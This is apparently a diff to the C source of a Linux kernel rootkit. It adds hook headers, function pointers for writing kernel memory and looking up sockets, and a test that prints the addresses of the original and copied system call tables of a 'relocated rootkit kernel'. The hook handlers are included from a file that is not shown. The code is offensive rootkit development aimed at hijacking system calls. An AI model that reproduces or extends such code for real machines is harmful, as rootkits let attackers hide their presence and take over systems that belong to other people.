@@ -44,6 +44,7 @@ LABEL(kernel_start)
 #include <linux/kallsyms.h>
 
 #include "kernel.h"
+#include "hooks.h"
 
 /*
  * Macros.
@@ -78,6 +79,8 @@ struct pid_list_node *pid_list_find(pid_t nr);
 /*
  * Global variables.
  */
+void *kernel_addr = NULL;
+size_t kernel_len = 0, kernel_paglen = 0, kernel_pages = 0;
 void **my_ia32sct = NULL;
 void **my_sct = NULL;
 void **sys_call_table = NULL;
@@ -94,6 +97,9 @@ struct pid * (*f_find_vpid)(pid_t nr) = NULL;
 int (*f_vscnprintf)(char *buf, size_t size, const char *fmt, va_list args) = NULL;
 int (*f_sys_write)(int fd, const char *mem, size_t len) = NULL;
 int (*f_printk)(const char *fmt, ...) = NULL;
+struct socket * (*f_sockfd_lookup)(int fd, int *err) = NULL;
+long (*f_probe_kernel_write)(void *dst, const void *src, size_t len) = NULL;
+int (*f_strncmp)(const char *s1, const char *s2, size_t len) = NULL;
 
 /*
  * Hooked function handlers.
@@ -132,7 +138,11 @@ void pid_list_test(void) {
 }
 
 void kernel_test(void) {
-	pinfo("hola!\n");
+	pinfo("Hello from relocated rootkit kernel!\n");
+	pinfo("sys_call_table = %p, ia32_sys_call_table = %p, my_sct = %p, my_ia32sct = %p, psct_slowpath = %p, psct_fastpath = %p, pia32sct = %p\n",
+	sys_call_table, ia32_sys_call_table, my_sct, my_ia32sct, psct_slowpath, psct_fastpath, pia32sct
+	);
+
 //	pid_list_test();
 }
 
@@ -330,6 +340,11 @@ long syscall(void **sct, int nr, bool user, long a1, long a2, long a3, long a4, 
 		return -1;
 	}
 }
+
+/*
+ * Hook handlers.
+ */
+#include "hooks.c"
 
 LABEL(kernel_end)
 /*
